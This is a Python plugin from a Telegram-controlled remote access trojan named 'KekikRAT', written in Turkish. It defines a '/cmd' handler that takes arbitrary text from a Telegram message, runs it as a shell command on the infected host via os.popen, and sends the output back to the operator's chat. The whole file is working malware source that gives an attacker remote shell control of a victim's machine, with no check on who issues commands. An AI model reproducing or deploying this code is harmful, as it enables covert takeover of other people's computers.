#!/usr/bin/env python
#! -*- coding: utf-8 -*-
# Bu araç @keyiflerolsun tarafından | @KekikAkademi için yazılmıştır.

from pyrogram import Client, Filters
from KekikRAT import adminID
import os

@Client.on_message(Filters.command(['cmd'], ['!','.','/']))
def cmd(client, message):
    message.reply_chat_action("typing")
    kekik = client.send_message(adminID, "Bekleyin..")

    mesaj = f"[{message.from_user.first_name}](tg://user?id={message.from_user.id}) | `cmd` Komutunu Verdi!\n"

    girilenYazi = message.text
    if len(girilenYazi.split()) == 1:
        kekik.edit("`komut` Girmelisiniz")
        return

    komut = " ".join(girilenYazi.split()[1:])
    mesaj += (f"\tDeniyorum : `{komut}`\n\n")

    if os.popen(komut).read():
        mesaj += os.popen(komut).read()
        mesaj += "\nBu kadar :)"
    else:
        mesaj += "\nOlmadı :)"

    kekik.edit(mesaj)